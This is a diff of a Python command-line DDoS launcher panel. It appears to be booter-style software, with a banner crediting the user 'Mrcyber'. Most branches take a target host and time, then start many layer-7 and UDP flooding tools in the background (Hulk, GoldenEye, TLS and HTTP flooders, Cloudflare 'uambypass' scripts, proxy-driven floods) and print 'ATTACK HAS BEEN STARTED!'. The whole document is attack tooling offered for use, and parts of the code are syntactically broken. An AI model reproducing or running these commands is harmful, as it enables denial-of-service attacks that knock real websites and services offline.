-				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 45 5 500')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[\033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLS \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "bot" or sinput == "BOT":
-			try:
-				host = sin.split()[1]
-				time = sin.split()[2]
-				os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
-				os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
-				os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
-				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
-				os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
-				os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBOT \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "brutal" or sinput == "BRUTAL":
-			try:
-				host = sin.split()[1]
-				time = sin.split()[2]
-				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')				
-				os.system(f'cd .bot && screen -dm python3 input.py {host} {time}')
-				os.system(f'cd .bot && screen -dm node count.js {host} 40 {time}')
-				os.system(f'cd .resources && screen -dm node count.js {host} 40 {time}')
-				os.system(f'cd /media && screen -dm node count.js {host} 40 {time}')
-				os.system(f'cd /media && screen -dm python3 input.py {host} {time}')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   LAYER-12 : \033[35m[ \033[1;37mBRUTAL \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "tlsv2" or sinput == "TLSV2":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 8 1')
-				os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
-				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 32 5 500')
-				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 32 1')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV2 \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "tlsv3" or sinput == "TLSV3":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
-				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
-				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
-				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
-				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 64 GET proxy.txt 16')
-				os.system(f'cd /media && screen -dm ./passkey {host} {time} 32 GET proxy.txt 16')
-				os.system(f'cd /media && screen -dm ./tls {host} {time} 300 5 500')
-				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')  
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mTLSV3 \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "http" or sinput == "HTTP":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
-				os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
-				os.system(f'cd .malware && screen -dm node HTTP-RAND.js {host} {time}')
-				os.system(f'cd .malware && screen -dm node HTTP.js {host} 300 8 {time}')
-				os.system(f'cd /media && screen -dm node HTTP.js {host} 300 8 {time}')
-				os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                   LAYER-7  : \033[35m[ \033[1;37mHTTP \033[35m]
-\033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "bomb2" or sinput == "BOMB2":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
-				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data GET')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB2 \033[35m]
-\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "bomb" or sinput == "BOMB":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
-				os.system(f'cd /media && screen -dm go run Low.go -site {host} -data GET')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                LAYER-7  : \033[35m[ \033[1;37mBOMB \033[35m]
-\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "golden" or sinput == "GOLDEN":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .resources && python3 goldeneye.py {host} -w 10 -s 500 -m random -d True')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET    : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME      : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT      : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                LAYER-7   : \033[35m[ \033[1;37mGOLDEN \033[35m]
-\033[1;37m                VIP       : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                USER      : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "https" or sinput == "HTTPS":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
-				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 8 500')		
-				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 5 128')
-				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 32')
-				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
-				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 5 128')
-				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')	
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS \033[35m]
-\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-			    main()
-		elif sinput == "https2" or sinput == "HTTPS2":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
-				os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 500 2')
-				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 500 5')
-				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 1 {time}')
-				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data GET')
-				os.system(f'cd .godzilla && screen -dm node HTTP-RAND.js {host} {time}')
-				os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
-				os.system(f'cd .resources && screen -dm go run Low.go -site {host} -data POST')
-				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
-				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
-				os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
-				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 500 2')
-				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 500 5')
-				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 1 {time}')
-				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
-				os.system(f'cd /media && screen -dm node HTTP-RAND.js {host} {time}')
-				os.system(f'cd /media && screen -dm go run strike.go -url {host} POST')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
-\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-                  
-		elif sinput == "BYPASS" or sinput == "BYPASS":
-			try:
-				host = sin.split()[1]
-				time = sin.split()[2]
-				thread = sin.split()[3]
-				proxy = sin.split()[4]
-				rps = sin.split()[5]
-				os.system(f'node HTTP-NIGGA.js {host} {time} {thread} {proxy} {rps}')
+        elif "udpbypass" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./UDPBYPASS {ip} {port}')
             except IndexError:
-                print('Usage: bypass <url> <time> <thread> <http.txt> <request_connenction>')
-                print('Example: bypass https://example.com 60 10 http.txt 5000')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                THREAD   : \033[35m[ \033[1;37m{thread} \033[35m]
-\033[1;37m                Proxy   : \033[35m[ \033[1;37m{proxy} \033[35m]
-\033[1;37m                Rps   : \033[35m[ \033[1;37m{thread} \033[35m]
-\033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
-\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-                        except ValueError:
-				main()
-			except IndexError:
-				main()
-		elif sinput == "tcp" or sinput == "TCP":
-			try:
-				url = sin.split()[1]
-				thread = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'node MIX.js {url} {thread} {time}')
+                print('Usage: udpbypass <ip> <port>')
+                print('Example: udpbypass 1.1.1.1 80')
+
+        elif "stdv2" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                os.system(f'./std {ip} {port}')
             except IndexError:
-                print('Usage: mix <url> <thread> <time>')
-                print('Example: mix http://example.com 500 60')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                THREAD     : \033[35m[ \033[1;37m{thread} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
-\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-			    main()			    
-		elif sinput == "bot2" or sinput == "BOT2":
-			try:
-				host = sin.split()[1]
-				time = sin.split()[2]
-				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
-				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')	
-				os.system(f'cd /media && screen -dm node OVER.js {host} 16 {time}')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                METHOD   : \033[35m[ \033[1;37mBOT2 \033[35m]
-\033[1;37m                LAYER-12 : \033[35m[ \033[32mVVIP \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-						    
-		elif "BROWSER" in cnc
-			try:
-				url = sin.split()[1]
-				thread = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'node MIX.js {url} {thread} {time}')
+                print('Usage: stdv2 <ip> <port>')
+                print('Example: stdv2 1.1.1.1 80')
+
+        elif "flux" in cnc:
+            try:
+                ip = cnc.split()[1]
+                port = cnc.split()[2]
+                thread = cnc.split()[3]
+                os.system(f'./flux {ip} {port} {thread} 0')
             except IndexError:
-                print('Usage: browser <url> <thread> <time>')
-                print('Example: browser http://example.com 500 60')	
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{url} \033[35m]
-\033[1;37m                THREAD     : \033[35m[ \033[1;37m{thread} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
-\033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-			    main()
-		elif sinput == "killnet" or sinput == "KILLNET":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
-				os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
-				os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
-				os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
-				os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
-				os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
-				os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
-				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
-				os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
-				os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
-				os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
-				os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
-				os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
-				os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
-				os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
-				os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
-				os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
-				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
-				os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
-				os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
-				os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
-				os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
-\033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
-\033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
-\033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
-\033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
-\033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
-\033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
-\033[35m           ╚════════════════════════════════════════════════════════╝
-""")
-			except ValueError:
-				main()
-			except IndexError:
-				main()			    			    
-		elif sinput == "uam" or sinput == "UAM":
-			try:
-				host = sin.split()[1]
-				port = sin.split()[2]
-				time = sin.split()[3]
-				os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
-				os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
-				os.system ("clear")
-				print(f"""
-\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
-\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
-\033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
-\033[1;37m                            ATTACK HAS BEEN STARTED!
-\033[35m                ╚╦════════════════════════════════════════════╦╝
-\033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
